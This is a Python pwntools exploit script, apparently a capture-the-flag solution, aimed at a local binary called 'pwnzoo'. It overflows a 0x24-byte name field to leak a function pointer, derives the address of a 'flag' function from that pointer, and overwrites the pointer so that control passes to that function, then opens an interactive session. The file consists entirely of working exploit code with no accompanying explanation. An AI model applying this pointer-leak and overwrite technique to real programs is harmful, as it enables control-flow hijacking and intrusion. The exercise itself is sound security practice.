from pwn import *
context.update(log_level = 'debug')
size_name = 0x24

def Change(name):
	p.sendlineafter(' Exit', '2')	
	p.sendline(name)

p = process('pwnzoo')
p.sendlineafter('dog? ', 'd')
p.sendline('a'*size_name)
p.sendlineafter(' Exit', '1')
addr_speak = u64(p.recvrepeat(1)[0x37:0x37+6].ljust(8, '\x00'))
log.info('speak : ' + hex(addr_speak))
addr_flag = addr_speak & 0xfffffffffffff23b
log.info('flag : ' + hex(addr_flag))
p.sendline('2')
p.sendline('a'*size_name + p64(addr_flag))
raw_input('debug: ' + str(p.pid))
p.interactive()
#Change('c'*size_name + p16(offset_flag))
